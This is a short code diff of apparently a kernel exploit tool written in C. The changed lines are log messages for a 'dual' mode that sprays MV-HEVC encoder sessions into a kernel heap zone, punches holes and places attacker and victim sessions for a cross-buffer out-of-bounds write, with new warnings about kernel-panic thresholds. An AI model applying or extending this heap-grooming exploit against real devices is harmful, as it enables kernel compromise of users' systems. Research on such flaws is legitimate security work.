@@ -631,7 +631,9 @@ int main(int argc, char *argv[]) {
 
     } else if (strcmp(mode, "dual") == 0) {
         rlog("DUAL: Multi-session spray + cross-buffer OOB + victim trigger\n");
-        rlog("This is the PRIMARY exploitation path:\n");
+        rlog("WARNING: Requires 360 encodes. Table 1 crash boundary is at ~197.\n");
+        rlog("Run 'crash_test' first! If crash at 197, this mode will kernel panic.\n");
+        rlog("Only proceed if crash_test proved 200+ encodes survive.\n\n");
         rlog("1. Create 20 MV-HEVC sessions (spray HEVC buffers in kalloc_data.49152)\n");
         rlog("2. Free alternating sessions to create holes\n");
         rlog("3. Create attacker + victim sessions in holes\n");
@@ -769,7 +771,7 @@ int main(int argc, char *argv[]) {
                 if (t1_entries >= 592) t1_state = "DANGER: +0x5C70 hit!";
                 else if (t1_entries >= 256) t1_state = "OOB (safe range)";
                 const char *t2_state = "pre-OOB";
-                if (t2_entries >= 466) t2_state = "HEAP OVERFLOW ACTIVE";
+                if (t2_entries >= 466) t2_state = "ALLOC PADDING OOB (not cross-alloc)";
                 else if (t2_entries >= 256) t2_state = "intra-buffer OOB";
                 rlog("[%d/%d] T1: ~%d entries (%s) | T2: ~%d entries (%s)\n",
                      i+1, t2_encodes, t1_entries, t1_state, t2_entries, t2_state);
